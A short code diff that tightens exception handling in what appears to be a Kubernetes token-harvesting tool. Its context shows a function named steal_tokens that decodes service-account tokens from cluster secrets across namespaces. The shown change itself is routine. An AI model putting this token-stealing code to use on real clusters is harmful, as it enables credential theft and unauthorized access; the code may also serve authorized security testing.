@@ -40,7 +40,9 @@ def _decode_jwt(raw: str) -> dict:
             "namespace": k8s.get("namespace", "unknown"),
             "expiry": payload.get("exp", "none — static token ⚠"),
         }
-    except Exception:
+    # ValueError covers bad base64 (binascii.Error) and JSON decode failures;
+    # AttributeError/TypeError guard against a payload that isn't a JSON object.
+    except (ValueError, TypeError, AttributeError):
         return {}
 
 
@@ -77,7 +79,9 @@ def steal_tokens(k8s, namespace: str = "all") -> str:
 
         try:
             raw_token = base64.b64decode(secret.data["token"]).decode("utf-8")
-        except Exception:
+        # bad base64 (binascii.Error) and non-UTF-8 bytes (UnicodeDecodeError)
+        # are both ValueError subclasses; TypeError guards a non-str/bytes value.
+        except (ValueError, TypeError):
             raw_token = None
 
         decoded = _decode_jwt(raw_token) if raw_token else {}
